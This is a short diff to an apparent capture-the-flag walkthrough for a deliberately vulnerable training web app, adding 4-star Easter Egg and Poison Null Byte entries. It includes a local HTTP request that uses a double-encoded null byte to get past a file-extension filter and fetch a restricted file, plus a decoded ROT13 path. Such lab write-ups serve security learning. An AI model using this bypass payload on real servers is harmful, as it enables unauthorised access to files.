@@ -219,8 +219,13 @@ Content-Type: application/json<br>
 
 ## 4 STAR
 
-### Vulnerable Library 
-
+### Easter Egg
+### Nested Easter Egg
+### Poison Null Byte 
+http://localhost:3000/ftp
+GET /ftp/eastere.gg%2500.md HTTP/1.1
+/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
+online Caesar ciper: /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
 
 
 
